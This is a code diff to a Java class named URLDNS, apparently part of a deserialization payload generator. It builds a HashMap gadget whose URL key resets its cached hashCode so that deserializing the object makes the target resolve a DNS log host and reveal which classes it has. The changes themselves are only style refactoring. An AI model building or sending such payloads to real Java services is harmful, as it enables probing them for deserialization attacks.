@@ -33,6 +33,8 @@ import java.util.List;
  * HashMap.hash()
  * URL.hashCode()
  */
+
+@SuppressWarnings({"unused"})
 @Dependencies()
 @Authors({Authors.GEBL})
 public class URLDNS implements ObjectPayload<Object> {
@@ -66,14 +68,14 @@ public class URLDNS implements ObjectPayload<Object> {
     };
 
 
-    public static List<Object> list = new LinkedList();
+    public static List<Object> list = new LinkedList<>();
 
     public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
-        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
+        HashMap<Object, Object> hashMap = new HashMap<>();
         URL url = new URL("http://" + urls);
         Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
         f.setAccessible(true);
-        f.set(url, Integer.valueOf(0));
+        f.set(url, 0);
         Class<?> clazz = null;
 
         if (clazzName != null) {
@@ -85,7 +87,7 @@ public class URLDNS implements ObjectPayload<Object> {
         }
 
         hashMap.put(url, clazz);
-        f.set(url, Integer.valueOf(-1));
+        f.set(url, -1);
         return hashMap;
     }
 
@@ -543,8 +545,8 @@ public class URLDNS implements ObjectPayload<Object> {
                 break;
 
             case "all":
-                for (int i = 0; i < defaultClass.length; i++) {
-                    setList(defaultClass[i], dnsLog);
+                for (String aClass : defaultClass) {
+                    setList(aClass, dnsLog);
                 }
                 break;
             default:
